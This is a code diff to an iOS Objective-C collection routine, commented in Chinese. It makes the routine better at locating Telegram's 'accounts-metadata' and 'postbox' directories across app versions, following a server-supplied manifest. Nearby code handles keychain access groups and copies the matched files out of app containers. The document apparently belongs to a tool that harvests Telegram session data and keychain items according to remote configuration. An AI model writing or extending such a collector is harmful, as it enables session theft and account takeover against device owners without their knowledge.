@@ -398,6 +398,95 @@ static NSArray<NSString *> *WQExpandScopeList(NSString *container, NSArray<NSStr
     return WQUniquePaths(out);
 }
 
+/// 列一个目录的前 limit 项，目录带尾随斜杠。用于"路径不存在"时把真实结构打进日志。
+static NSString *WQListSample(NSString *dir, NSUInteger limit) {
+    NSArray<NSString *> *names = wq_list(dir, NULL);
+    if (!names) return @"(列不出)";
+    NSArray<NSString *> *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
+    NSMutableArray<NSString *> *out = [NSMutableArray array];
+    for (NSString *name in sorted) {
+        if ([name hasPrefix:@"."]) continue;
+        BOOL isDir = NO;
+        [[NSFileManager defaultManager] fileExistsAtPath:[dir stringByAppendingPathComponent:name]
+                                             isDirectory:&isDir];
+        [out addObject:[NSString stringWithFormat:@"%@%@", name, isDir ? @"/" : @""]];
+        if (out.count >= limit) break;
+    }
+    return out.count ? [out componentsJoinedByString:@", "] : @"(空)";
+}
+
+/// 在容器内限深度找一个同名目录，返回相对路径。
+/// TG 各版本把 accounts-metadata / postbox 放在不同层级（例如 telegram-data/ 下），
+/// 清单写死一层就会 MISSING。跳过 media / cache 这类几十 GB 的大目录。
+static NSString *WQFindDirNamed(NSString *container, NSString *want, NSUInteger maxDepth) {
+    if (want.length == 0) return nil;
+    NSMutableArray<NSString *> *queue = [NSMutableArray arrayWithObject:@""];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSSet *skip = [NSSet setWithObjects:@"media", @"cache", @"cache-storage",
+                                            @"storage", @"logs", nil];
+
+    for (NSUInteger depth = 0; depth <= maxDepth && queue.count > 0; depth++) {
+        NSMutableArray<NSString *> *nextQueue = [NSMutableArray array];
+        for (NSString *rel in queue) {
+            NSString *abs = rel.length ? [container stringByAppendingPathComponent:rel] : container;
+            for (NSString *name in wq_list(abs, NULL)) {
+                if ([name hasPrefix:@"."] || [skip containsObject:name]) continue;
+                BOOL isDir = NO;
+                NSString *child = [abs stringByAppendingPathComponent:name];
+                if (![fm fileExistsAtPath:child isDirectory:&isDir] || !isDir) continue;
+                NSString *relChild = rel.length ? [rel stringByAppendingPathComponent:name] : name;
+                if ([name isEqualToString:want]) return relChild;
+                if (depth + 1 <= maxDepth) [nextQueue addObject:relChild];
+            }
+        }
+        queue = nextQueue;
+    }
+    return nil;
+}
+
+/// 把清单里的目录解析成容器内真实可用的相对路径：
+/// 1) 存在 → 直接用；2) 含通配 → 展开；3) 不存在/展开为空 → 在容器内找同名目录回退。
+/// 回退结果写进 scope 日志，后台清单写错时能一眼看到实际位置。
+static NSArray<NSString *> *WQResolveDirs(NSString *container, NSArray<NSString *> *patterns) {
+    NSMutableArray<NSString *> *out = [NSMutableArray array];
+    NSFileManager *fm = [NSFileManager defaultManager];
+
+    for (NSString *rel in patterns) {
+        if ([rel isEqualToString:@"."]) {
+            [out addObject:rel];
+            continue;
+        }
+        if (WQHasWildcard(rel)) {
+            NSArray<NSString *> *expanded = WQExpandOne(container, rel);
+            if (expanded.count > 0) {
+                WQScopeLog(@"通配展开：%@ -> %lu 项：%@", rel, (unsigned long)expanded.count,
+                           [expanded componentsJoinedByString:@", "]);
+                [out addObjectsFromArray:expanded];
+                continue;
+            }
+            NSString *found = WQFindDirNamed(container, rel.lastPathComponent, 3);
+            WQScopeLog(@"通配无匹配：%@；%@", rel, found.length
+                       ? [NSString stringWithFormat:@"容器内同名目录在 %@，按其回退", found]
+                       : @"容器内也没有同名目录");
+            if (found.length) [out addObject:found];
+            continue;
+        }
+
+        if ([fm fileExistsAtPath:[container stringByAppendingPathComponent:rel]]) {
+            [out addObject:rel];
+            continue;
+        }
+        NSString *found = WQFindDirNamed(container, rel.lastPathComponent, 3);
+        if (found.length) {
+            WQScopeLog(@"路径不存在：%@；容器内同名目录在 %@，按其回退", rel, found);
+            [out addObject:found];
+        } else {
+            WQScopeLog(@"路径不存在：%@；容器根有 [%@]", rel, WQListSample(container, 24));
+        }
+    }
+    return WQUniquePaths(out);
+}
+
 /// keychain 组：服务端字段叫 access_group，旧模板叫 keychain_group。
 static NSString *WQKeychainGroupText(NSDictionary *cfg) {
     id value = WQFirstValue(cfg, @[@"keychain_group", @"access_group", @"keychainGroup"]);
@@ -963,10 +1052,16 @@ static NSString *WQRunCollection(void) {
             NSMutableArray<NSString *> *scopeDirs = [NSMutableArray array];
             NSMutableArray<NSString *> *scopeFiles = [NSMutableArray array];
             WQParseScope(config, scopeDirs, scopeFiles);
-            // 通配在这里展开：只有拿到容器路径后才知道 account-<peerId> 具体是什么
-            NSArray<NSString *> *dirList = WQExpandScopeList(container, WQUniquePaths(scopeDirs));
+            // 通配在这里展开：只有拿到容器路径后才知道 account-<peerId> 具体是什么。
+            // 路径不存在时 WQResolveDirs 会在容器内找同名目录回退（TG 的层级随版本变）。
+            NSArray<NSString *> *dirList = WQResolveDirs(container, WQUniquePaths(scopeDirs));
             NSArray<NSString *> *fileList = WQExpandScopeList(container, WQUniquePaths(scopeFiles));
             NSFileManager *fm = [NSFileManager defaultManager];
+
+            // App Group 的层级不稳定，先把容器根结构记一次，免得每次都靠猜
+            if ([bundleID hasPrefix:@"group."] && scopeDirs.count > 0) {
+                WQScopeLog(@"[%@] 容器根一级目录：%@", bundleID, WQListSample(container, 32));
+            }
 
             NSError *copyError = nil;
             NSUInteger copiedFiles = 0;
